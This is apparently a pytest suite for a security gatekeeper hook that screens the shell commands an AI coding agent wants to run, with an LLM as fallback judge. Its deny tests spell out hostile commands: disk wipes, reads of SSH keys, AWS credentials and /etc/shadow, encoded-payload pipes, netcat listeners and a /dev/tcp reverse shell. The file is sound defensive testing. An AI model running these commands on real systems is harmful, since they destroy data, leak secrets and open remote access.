"""Unit tests for the security gatekeeper hook.

Tests the pure functions directly (no subprocess, no API calls).
Covers: deny patterns, safe patterns, env prefix stripping, path stripping,
permission rule parsing, file path extraction, and the local_evaluate chain.
"""

import json
import sys
import pytest
from pathlib import Path
from unittest.mock import patch, MagicMock

# Add the gatekeeper module to path so we can import it directly
GATEKEEPER_DIR = Path(__file__).resolve().parent.parent.parent / "jacked" / "data" / "hooks"
sys.path.insert(0, str(GATEKEEPER_DIR))

import security_gatekeeper as gk


# ---------------------------------------------------------------------------
# _strip_env_prefix
# ---------------------------------------------------------------------------

class TestStripEnvPrefix:
    """Tests for stripping leading env var assignments from commands."""

    def test_no_prefix(self):
        assert gk._strip_env_prefix("git status") == "git status"

    def test_single_var(self):
        assert gk._strip_env_prefix("HOME=/tmp git status") == "git status"

    def test_multiple_vars(self):
        assert gk._strip_env_prefix('HOME=/tmp PATH="/usr/bin" git status') == "git status"

    def test_quoted_values(self):
        assert gk._strip_env_prefix("FOO='bar baz' cmd") == "cmd"

    def test_double_quoted_values(self):
        assert gk._strip_env_prefix('FOO="bar baz" cmd') == "cmd"

    def test_preserves_command_with_equals(self):
        """Commands containing = but not as env assignments should be preserved."""
        assert gk._strip_env_prefix("echo foo=bar") == "echo foo=bar"

    def test_empty_string(self):
        assert gk._strip_env_prefix("") == ""

    def test_whitespace_only(self):
        assert gk._strip_env_prefix("   ") == ""


# ---------------------------------------------------------------------------
# _get_base_command
# ---------------------------------------------------------------------------

class TestGetBaseCommand:
    """Tests for extracting base command name from full paths."""

    def test_simple_command(self):
        assert gk._get_base_command("git status") == "git status"

    def test_unix_path(self):
        result = gk._get_base_command("/usr/bin/python3 script.py")
        assert result == "python3 script.py"

    def test_windows_path(self):
        result = gk._get_base_command("C:\\Python312\\python.exe -m pytest")
        assert result == "python -m pytest"

    def test_windows_path_with_spaces(self):
        result = gk._get_base_command("C:/Users/jack/.conda/envs/jacked/python.exe -m pytest")
        assert result == "python -m pytest"

    def test_exe_extension_stripped(self):
        result = gk._get_base_command("C:\\Windows\\where.exe python")
        assert result == "where python"

    def test_bare_command(self):
        assert gk._get_base_command("ls") == "ls"

    def test_leading_whitespace(self):
        assert gk._get_base_command("  git status") == "git status"


# ---------------------------------------------------------------------------
# local_evaluate — deny patterns
# ---------------------------------------------------------------------------

class TestLocalEvaluateDeny:
    """Tests that dangerous commands are blocked (return 'NO')."""

    def test_rm_rf_root(self):
        assert gk.local_evaluate("rm -rf /") == "NO"

    def test_rm_rf_home(self):
        assert gk.local_evaluate("rm -rf ~") == "NO"

    def test_rm_rf_home_var(self):
        assert gk.local_evaluate("rm -rf $HOME") == "NO"

    def test_rm_rf_windows_drive(self):
        assert gk.local_evaluate("rm -rf C:\\") == "NO"

    def test_sudo(self):
        assert gk.local_evaluate("sudo apt install foo") == "NO"

    def test_su_switch(self):
        assert gk.local_evaluate("su - root") == "NO"

    def test_runas(self):
        assert gk.local_evaluate("runas /user:admin cmd") == "NO"

    def test_dd(self):
        assert gk.local_evaluate("dd if=/dev/zero of=/dev/sda") == "NO"

    def test_mkfs(self):
        assert gk.local_evaluate("mkfs.ext4 /dev/sda1") == "NO"

    def test_fdisk(self):
        assert gk.local_evaluate("fdisk /dev/sda") == "NO"

    def test_diskpart(self):
        assert gk.local_evaluate("diskpart") == "NO"

    def test_format_drive(self):
        assert gk.local_evaluate("format C:") == "NO"

    def test_cat_ssh_key(self):
        assert gk.local_evaluate("cat ~/.ssh/id_rsa") == "NO"

    def test_cat_aws_creds(self):
        assert gk.local_evaluate("cat ~/.aws/credentials") == "NO"

    def test_cat_etc_passwd(self):
        assert gk.local_evaluate("cat /etc/passwd") == "NO"

    def test_cat_etc_shadow(self):
        assert gk.local_evaluate("cat /etc/shadow") == "NO"

    def test_base64_decode_pipe(self):
        assert gk.local_evaluate("echo payload | base64 --decode | sh") == "NO"

    def test_powershell_encoded(self):
        assert gk.local_evaluate("powershell -EncodedCommand ZWNobyAiaGFja2VkIg==") == "NO"

    def test_nc_listen(self):
        assert gk.local_evaluate("nc -l 4444") == "NO"

    def test_ncat_listen(self):
        assert gk.local_evaluate("ncat -l -p 4444") == "NO"

    def test_reverse_shell(self):
        assert gk.local_evaluate("bash -i >& /dev/tcp/10.0.0.1/4444") == "NO"

    def test_reg_add(self):
        assert gk.local_evaluate("reg add HKLM\\SOFTWARE\\foo") == "NO"

    def test_reg_delete(self):
        assert gk.local_evaluate("reg delete HKLM\\SOFTWARE\\foo") == "NO"

    def test_crontab(self):
        assert gk.local_evaluate("crontab -e") == "NO"

    def test_schtasks(self):
        assert gk.local_evaluate("schtasks /create /tn task") == "NO"

    def test_chmod_777(self):
        assert gk.local_evaluate("chmod 777 /etc") == "NO"

    def test_kill_pid_1(self):
        assert gk.local_evaluate("kill -9 1") == "NO"

    def test_deny_with_env_prefix(self):
        """Env var prefix should be stripped before deny check."""
        assert gk.local_evaluate("HOME=/tmp rm -rf /") == "NO"

    def test_deny_with_multiple_env_prefixes(self):
        assert gk.local_evaluate('HOME=/tmp PATH="/x" sudo apt install foo') == "NO"


# ---------------------------------------------------------------------------
# local_evaluate — safe patterns
# ---------------------------------------------------------------------------

class TestLocalEvaluateSafe:
    """Tests that safe commands are approved (return 'YES')."""

    # --- exact matches ---
    def test_ls_exact(self):
        assert gk.local_evaluate("ls") == "YES"

    def test_dir_exact(self):
        assert gk.local_evaluate("dir") == "YES"

    def test_pwd_exact(self):
        assert gk.local_evaluate("pwd") == "YES"

    def test_env_exact(self):
        assert gk.local_evaluate("env") == "YES"

    def test_git_status_exact(self):
        assert gk.local_evaluate("git status") == "YES"

    def test_git_diff_exact(self):
        assert gk.local_evaluate("git diff") == "YES"

    def test_pip_list_exact(self):
        assert gk.local_evaluate("pip list") == "YES"

    def test_npm_test_exact(self):
        assert gk.local_evaluate("npm test") == "YES"

    # --- prefix matches ---
    def test_git_log(self):
        assert gk.local_evaluate("git log --oneline -5") == "YES"

    def test_git_push(self):
        assert gk.local_evaluate("git push origin master") == "YES"

    def test_echo(self):
        assert gk.local_evaluate("echo hello world") == "YES"

    def test_cat_file(self):
        assert gk.local_evaluate("cat somefile.txt") == "YES"

    def test_grep(self):
        assert gk.local_evaluate("grep -r TODO .") == "YES"

    def test_rg(self):
        assert gk.local_evaluate("rg pattern src/") == "YES"

    def test_find(self):
        assert gk.local_evaluate("find . -name '*.py'") == "YES"

    def test_pytest(self):
        assert gk.local_evaluate("pytest tests/ -v") == "YES"

    def test_python_m_pytest(self):
        assert gk.local_evaluate("python -m pytest tests/") == "YES"

    def test_pip_install_editable(self):
        assert gk.local_evaluate("pip install -e .") == "YES"

    def test_pip_install_requirements(self):
        assert gk.local_evaluate("pip install -r requirements.txt") == "YES"

    def test_pip_show(self):
        assert gk.local_evaluate("pip show requests") == "YES"

    def test_pip_freeze(self):
        assert gk.local_evaluate("pip freeze") == "YES"

    def test_npm_run_test(self):
        assert gk.local_evaluate("npm run test") == "YES"

    def test_npm_run_build(self):
        assert gk.local_evaluate("npm run build") == "YES"

    def test_npm_start(self):
        assert gk.local_evaluate("npm start") == "YES"

    def test_ruff(self):
        assert gk.local_evaluate("ruff check .") == "YES"

    def test_black(self):
        assert gk.local_evaluate("black src/") == "YES"

    def test_mypy(self):
        assert gk.local_evaluate("mypy src/") == "YES"

    def test_gh_command(self):
        assert gk.local_evaluate("gh pr list") == "YES"

    def test_docker_ps(self):
        assert gk.local_evaluate("docker ps") == "YES"

    def test_docker_build(self):
        assert gk.local_evaluate("docker build -t myimage .") == "YES"

    def test_make(self):
        assert gk.local_evaluate("make test") == "YES"

    def test_cargo_test(self):
        assert gk.local_evaluate("cargo test") == "YES"

    def test_cargo_build(self):
        assert gk.local_evaluate("cargo build") == "YES"

    def test_npx(self):
        assert gk.local_evaluate("npx prettier --write .") == "YES"

    def test_jacked(self):
        assert gk.local_evaluate("jacked --help") == "YES"

    # --- version/help flags ---
    def test_version_flag(self):
        assert gk.local_evaluate("node --version") == "YES"

    def test_version_short(self):
        assert gk.local_evaluate("python -V") == "YES"

    def test_help_flag(self):
        assert gk.local_evaluate("python --help") == "YES"

    def test_help_short(self):
        assert gk.local_evaluate("cargo -h") == "YES"

    # --- python safe modules ---
    def test_python_m_pip(self):
        assert gk.local_evaluate("python -m pip list") == "YES"

    def test_python_m_http_server(self):
        assert gk.local_evaluate("python -m http.server 8000") == "YES"

    def test_python_m_json_tool(self):
        assert gk.local_evaluate("python -m json.tool data.json") == "YES"

    def test_python_m_venv(self):
        assert gk.local_evaluate("python -m venv .venv") == "YES"

    # --- path-stripped commands ---
    def test_full_path_python_m_pytest(self):
        assert gk.local_evaluate("C:/Python312/python.exe -m pytest") == "YES"

    def test_conda_env_python_m_pytest(self):
        assert gk.local_evaluate("C:/Users/jack/.conda/envs/jacked/python.exe -m pytest tests/") == "YES"


# ---------------------------------------------------------------------------
# local_evaluate — ambiguous (returns None, falls to LLM)
# ---------------------------------------------------------------------------

class TestLocalEvaluateAmbiguous:
    """Tests that ambiguous commands return None (fall through to LLM)."""

    def test_pip_install_package(self):
        """Bare pip install should NOT be auto-approved locally."""
        assert gk.local_evaluate("pip install requests") is None

    def test_pipx_install(self):
        assert gk.local_evaluate("pipx install claude-jacked") is None

    def test_npm_install_package(self):
        assert gk.local_evaluate("npm install express") is None

    def test_python_script(self):
        """Running a python script should be ambiguous (needs LLM to read file)."""
        assert gk.local_evaluate("python my_script.py") is None

    def test_python_c(self):
        """python -c should NOT be auto-approved."""
        assert gk.local_evaluate('python -c "print(42)"') is None

    def test_curl(self):
        assert gk.local_evaluate("curl https://example.com") is None

    def test_wget(self):
        assert gk.local_evaluate("wget https://example.com/file.zip") is None

    def test_mv_command(self):
        assert gk.local_evaluate("mv old.txt new.txt") is None

    def test_cp_command(self):
        assert gk.local_evaluate("cp src.txt dst.txt") is None

    def test_unknown_command(self):
        assert gk.local_evaluate("some_random_tool --do-stuff") is None

    def test_node_e(self):
        assert gk.local_evaluate('node -e "console.log(42)"') is None


# ---------------------------------------------------------------------------
# extract_file_paths
# ---------------------------------------------------------------------------

class TestExtractFilePaths:
    """Tests for extracting file paths from commands."""

    def test_python_script(self):
        assert gk.extract_file_paths("python my_script.py") == ["my_script.py"]

    def test_multiple_files(self):
        result = gk.extract_file_paths("python run.py --config setup.sh")
        assert "run.py" in result
        assert "setup.sh" in result

    def test_sql_file(self):
        assert gk.extract_file_paths("sqlite3 db.sqlite < migrate.sql") == ["migrate.sql"]

    def test_js_file(self):
        assert gk.extract_file_paths("node server.js") == ["server.js"]

    def test_ts_file(self):
        assert gk.extract_file_paths("npx ts-node app.ts") == ["app.ts"]

    def test_no_files(self):
        assert gk.extract_file_paths("git status") == []

    def test_bat_file(self):
        assert gk.extract_file_paths("cmd /c build.bat") == ["build.bat"]

    def test_path_with_dirs(self):
        assert gk.extract_file_paths("python src/main.py") == ["src/main.py"]

    def test_go_file(self):
        assert gk.extract_file_paths("go run main.go") == ["main.go"]

    def test_rust_file(self):
        assert gk.extract_file_paths("rustc lib.rs") == ["lib.rs"]


# ---------------------------------------------------------------------------
# _parse_bash_pattern
# ---------------------------------------------------------------------------

class TestParseBashPattern:
    """Tests for parsing Bash permission patterns from settings."""

    def test_wildcard_pattern(self):
        prefix, is_wildcard = gk._parse_bash_pattern("Bash(git :*)")
        assert prefix == "git "
        assert is_wildcard is True

    def test_exact_pattern(self):
        prefix, is_wildcard = gk._parse_bash_pattern("Bash(git status)")
        assert prefix == "git status"
        assert is_wildcard is False

    def test_complex_wildcard(self):
        prefix, is_wildcard = gk._parse_bash_pattern("Bash(npm run :*)")
        assert prefix == "npm run "
        assert is_wildcard is True


# ---------------------------------------------------------------------------
# check_permissions (with mock settings files)
# ---------------------------------------------------------------------------

class TestCheckPermissions:
    """Tests for permission rule matching from settings files."""

    def test_wildcard_match(self, tmp_path):
        settings = tmp_path / ".claude" / "settings.json"
        settings.parent.mkdir(parents=True)
        settings.write_text(json.dumps({
            "permissions": {"allow": ["Bash(git :*)"]}
        }))
        with patch.object(Path, 'home', return_value=tmp_path):
            assert gk.check_permissions("git push origin main", str(tmp_path)) is True

    def test_exact_match(self, tmp_path):
        settings = tmp_path / ".claude" / "settings.json"
        settings.parent.mkdir(parents=True)
        settings.write_text(json.dumps({
            "permissions": {"allow": ["Bash(git status)"]}
        }))
        with patch.object(Path, 'home', return_value=tmp_path):
            assert gk.check_permissions("git status", str(tmp_path)) is True

    def test_no_match(self, tmp_path):
        settings = tmp_path / ".claude" / "settings.json"
        settings.parent.mkdir(parents=True)
        settings.write_text(json.dumps({
            "permissions": {"allow": ["Bash(git :*)"]}
        }))
        with patch.object(Path, 'home', return_value=tmp_path):
            assert gk.check_permissions("rm -rf /", str(tmp_path)) is False

    def test_no_settings_file(self, tmp_path):
        with patch.object(Path, 'home', return_value=tmp_path):
            assert gk.check_permissions("git status", str(tmp_path)) is False

    def test_project_settings(self, tmp_path):
        """Project-level settings should also be checked."""
        project = tmp_path / "myproject"
        settings = project / ".claude" / "settings.json"
        settings.parent.mkdir(parents=True)
        settings.write_text(json.dumps({
            "permissions": {"allow": ["Bash(npm test)"]}
        }))
        with patch.object(Path, 'home', return_value=tmp_path):
            assert gk.check_permissions("npm test", str(project)) is True

    def test_env_prefix_stripped_for_permission_check(self, tmp_path):
        """Commands with env prefixes should still match permission rules."""
        settings = tmp_path / ".claude" / "settings.json"
        settings.parent.mkdir(parents=True)
        settings.write_text(json.dumps({
            "permissions": {"allow": ["Bash(git :*)"]}
        }))
        with patch.object(Path, 'home', return_value=tmp_path):
            assert gk.check_permissions("HOME=/tmp git push", str(tmp_path)) is True


# ---------------------------------------------------------------------------
# read_file_context
# ---------------------------------------------------------------------------

class TestReadFileContext:
    """Tests for reading file contents referenced in commands."""

    def test_reads_python_file(self, tmp_path):
        script = tmp_path / "test.py"
        script.write_text("print('hello')")
        result = gk.read_file_context(f"python {script.name}", str(tmp_path))
        assert "print('hello')" in result
        assert "--- FILE:" in result

    def test_no_files_returns_empty(self):
        assert gk.read_file_context("git status", "/tmp") == ""

    def test_missing_file_returns_empty(self, tmp_path):
        result = gk.read_file_context("python nonexistent.py", str(tmp_path))
        assert result == ""

    def test_limits_to_3_files(self, tmp_path):
        for i in range(5):
            (tmp_path / f"f{i}.py").write_text(f"# file {i}")
        result = gk.read_file_context(
            "python f0.py f1.py f2.py f3.py f4.py", str(tmp_path)
        )
        assert result.count("--- FILE:") == 3

    def test_skips_large_files(self, tmp_path):
        big_file = tmp_path / "huge.py"
        big_file.write_text("x" * (gk.MAX_FILE_READ + 1))
        result = gk.read_file_context("python huge.py", str(tmp_path))
        assert result == ""


# ---------------------------------------------------------------------------
# emit_allow output format
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# parse_llm_response — JSON parsing with text fallback
# ---------------------------------------------------------------------------

class TestParseLlmResponse:
    """Tests for parsing LLM JSON/text responses. Security-critical path."""

    # --- valid JSON ---
    def test_json_safe_true(self):
        safe, reason = gk.parse_llm_response('{"safe": true}')
        assert safe is True
        assert reason == ""

    def test_json_safe_false(self):
        safe, reason = gk.parse_llm_response('{"safe": false}')
        assert safe is False
        assert reason == ""

    def test_json_safe_false_with_reason(self):
        safe, reason = gk.parse_llm_response('{"safe": false, "reason": "installs arbitrary code"}')
        assert safe is False
        assert reason == "installs arbitrary code"

    def test_json_safe_true_with_reason_ignored(self):
        safe, reason = gk.parse_llm_response('{"safe": true, "reason": "whatever"}')
        assert safe is True

    # --- type confusion attacks (must NOT approve) ---
    def test_string_true_not_approved(self):
        """String "true" must not be treated as boolean True."""
        safe, _ = gk.parse_llm_response('{"safe": "true"}')
        assert safe is not True  # string "true", not bool True

    def test_string_false(self):
        safe, _ = gk.parse_llm_response('{"safe": "false"}')
        assert safe is not True

    def test_int_1_not_approved(self):
        safe, _ = gk.parse_llm_response('{"safe": 1}')
        assert safe is not True

    def test_int_0(self):
        safe, _ = gk.parse_llm_response('{"safe": 0}')
        assert safe is not True

    def test_null_safe(self):
        safe, _ = gk.parse_llm_response('{"safe": null}')
        assert safe is None

    # --- malformed JSON (must NOT approve) ---
    def test_empty_object(self):
        safe, _ = gk.parse_llm_response('{}')
        assert safe is None

    def test_wrong_key(self):
        safe, _ = gk.parse_llm_response('{"result": true}')
        assert safe is None

    def test_array_input(self):
        safe, _ = gk.parse_llm_response('[{"safe": true}]')
        assert safe is not True

    def test_truncated_json(self):
        safe, _ = gk.parse_llm_response('{"safe": fal')
        assert safe is not True

    def test_empty_string(self):
        safe, _ = gk.parse_llm_response('')
        assert safe is None

    def test_whitespace_only(self):
        safe, _ = gk.parse_llm_response('   ')
        assert safe is None

    # --- markdown code fences ---
    def test_fenced_json_true(self):
        safe, _ = gk.parse_llm_response('```json\n{"safe": true}\n```')
        assert safe is True

    def test_fenced_json_false_with_reason(self):
        safe, reason = gk.parse_llm_response('```\n{"safe": false, "reason": "destructive"}\n```')
        assert safe is False
        assert reason == "destructive"

    # --- text fallback ---
    def test_text_yes(self):
        safe, _ = gk.parse_llm_response('YES')
        assert safe is True

    def test_text_yes_lowercase(self):
        safe, _ = gk.parse_llm_response('yes')
        assert safe is True

    def test_text_no(self):
        safe, _ = gk.parse_llm_response('NO')
        assert safe is False

    def test_text_no_lowercase(self):
        safe, _ = gk.parse_llm_response('no')
        assert safe is False

    def test_text_ambiguous(self):
        """Random text that isn't YES/NO should not approve."""
        safe, _ = gk.parse_llm_response('maybe')
        assert safe is None

    def test_text_with_explanation(self):
        """'not sure' starts with 'NO' after uppercasing — should be False, not approved."""
        safe, _ = gk.parse_llm_response('not sure about this')
        assert safe is not True


class TestEmitAllow:
    """Tests that emit_allow produces correct JSON."""

    def test_output_format(self, capsys):
        gk.emit_allow()
        captured = capsys.readouterr()
        output = json.loads(captured.out.strip())
        assert output == {
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "allow",
            }
        }
